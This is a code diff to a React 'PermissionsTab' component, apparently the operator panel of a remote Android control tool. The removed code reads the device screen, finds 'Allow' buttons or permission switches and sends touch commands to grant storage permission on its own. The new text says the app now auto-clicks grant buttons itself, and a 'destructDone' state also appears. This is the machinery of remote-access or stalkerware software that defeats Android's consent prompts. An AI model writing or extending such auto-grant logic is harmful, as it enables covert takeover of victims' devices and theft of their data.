@@ -1,4 +1,4 @@
-import React, { useState, useCallback, useEffect, useRef } from 'react';
+import React, { useState, useCallback } from 'react';
 
 const PERMISSION_LABELS = {
   'android.permission.CAMERA':                              'Camera',
@@ -42,82 +42,16 @@ export default function PermissionsTab({ device, sendCommand, results }) {
   const [destructDone, setDestructDone]   = useState(false);
   const [storageAutoGranting, setStorageAutoGranting] = useState(false);
   const [storageStatus, setStorageStatus] = useState('');
-  const storageRef = useRef({ active: false, timer: null, lastReadCount: 0, lastClickedAt: 0 });
-
-  function findGrantElement(elements) {
-    for (const el of elements) {
-      if (el.clickable && el.text && el.text.toLowerCase().includes('allow access')) return el;
-    }
-    for (const el of elements) {
-      if (el.clickable && el.text && el.text.toLowerCase().trim() === 'allow') return el;
-    }
-    for (const el of elements) {
-      if (el.clickable && !el.checked && (el.className || '').toLowerCase().includes('switch')) return el;
-    }
-    return null;
-  }
-
-  useEffect(() => {
-    if (!storageRef.current.active) return;
-    const screenResults = results.filter(r => r.command === 'read_screen' && r.success && r.response);
-    if (screenResults.length <= storageRef.current.lastReadCount) return;
-    storageRef.current.lastReadCount = screenResults.length;
-    const latest = screenResults[0];
-    let screenData = null;
-    try {
-      const parsed = typeof latest.response === 'string' ? JSON.parse(latest.response) : latest.response;
-      screenData = parsed?.screen || null;
-    } catch (_) {}
-    if (!screenData) return;
-    const elements = screenData.elements || [];
-
-    // Check if a switch is already checked — permission granted
-    const checkedSwitch = elements.find(el => (el.className || '').toLowerCase().includes('switch') && el.checked);
-    if (checkedSwitch) {
-      storageRef.current.active = false;
-      if (storageRef.current.timer) { clearInterval(storageRef.current.timer); storageRef.current.timer = null; }
-      setStorageAutoGranting(false);
-      setStorageStatus('Storage permission granted.');
-      return;
-    }
-
-    const el = findGrantElement(elements);
-    if (el && el.bounds) {
-      const now = Date.now();
-      // Debounce: don't click the same element more than once every 2 seconds
-      if (now - storageRef.current.lastClickedAt < 2000) return;
-      storageRef.current.lastClickedAt = now;
-      const cx = Math.round((el.bounds.left + el.bounds.right) / 2);
-      const cy = Math.round((el.bounds.top + el.bounds.bottom) / 2);
-      setStorageStatus(`Clicking "${el.text || 'switch'}" at (${cx}, ${cy}) — waiting for confirmation…`);
-      sendCommand(deviceId, 'touch', { x: cx, y: cy, duration: 100 });
-      // Keep polling — next read_screen will confirm if granted
-    } else {
-      setStorageStatus(`Scanning… (${screenData.packageName || '?'}) — no grant button yet, retrying…`);
-    }
-  }, [results]);
 
   const handleStoragePermission = useCallback(() => {
-    setStorageStatus('Sending request to device…');
+    setStorageStatus('Requesting storage permission on device...');
     setStorageAutoGranting(true);
-    storageRef.current.active = true;
-    storageRef.current.lastReadCount = results.filter(r => r.command === 'read_screen').length;
     sendCommand(deviceId, 'request_storage_permission', {});
-    sendCommand(deviceId, 'read_screen');
-    setStorageStatus('Reading screen immediately — looking for permission UI…');
-    storageRef.current.timer = setInterval(() => {
-      if (!storageRef.current.active) { clearInterval(storageRef.current.timer); return; }
-      sendCommand(deviceId, 'read_screen');
-    }, 1500);
     setTimeout(() => {
-      if (storageRef.current.active) {
-        clearInterval(storageRef.current.timer);
-        storageRef.current.active = false;
-        setStorageAutoGranting(false);
-        setStorageStatus('Timed out. Grant manually on device if needed.');
-      }
-    }, 22000);
-  }, [deviceId, sendCommand, results]);
+      setStorageAutoGranting(false);
+      setStorageStatus('Storage permission request sent. App will auto-click grant buttons.');
+    }, 5000);
+  }, [deviceId, sendCommand]);
 
   const parsePermissionsFromResults = useCallback((res) => {
     const match = res.find(r => r.command === 'get_permissions' && r.success);
